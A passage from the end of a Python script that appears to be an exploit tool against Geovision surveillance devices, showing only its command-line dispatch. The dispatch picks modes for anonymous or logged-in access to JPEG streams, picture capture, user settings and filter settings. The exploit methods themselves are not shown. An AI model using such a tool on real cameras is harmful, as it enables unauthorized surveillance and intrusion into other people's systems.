		if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).GeoToken():
			print("[!] Failed")
			sys.exit(1)
		else:
			sys.exit(0)


	if anonymous:
		if jpegstream:
			if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).JpegStream(DumpSettings):
				print("[!] Failed")
				sys.exit(0)
		elif picturecatch:
			if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).PictureCatch(DumpSettings):
				print("[!] Failed")
				sys.exit(0)
		else:
			print("[!] Needed: --anonymous [--picturecatch | --jpegstream]")
			sys.exit(1)

	else:
		#
		# Geovision Login needed
		#
		if usersetting:
			if Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).Login():
				if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).UserSetting(DumpSettings):
					print("[!] Failed")
					sys.exit(0)
		elif filtersetting:
			if Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).Login():
				if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).FilterSetting():
					print("[!] Failed")
					sys.exit(0)
		elif jpegstream:
			if Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).Login():
				if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).JpegStream(DumpSettings):
					print("[!] Failed")
					sys.exit(0)
		elif picturecatch:
			if Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).Login():
				if not Geovision(rhost,proto,verbose,credentials,raw_request,noexploit,headers,SessionID).PictureCatch(DumpSettings):
					print("[!] Failed")
					sys.exit(0)
		else:
			print("[!] Needed: --usersetting | --jpegstream | --picturecatch | --filtersetting")
			sys.exit(1)

	sys.exit(0)
#
# [EOF]
#
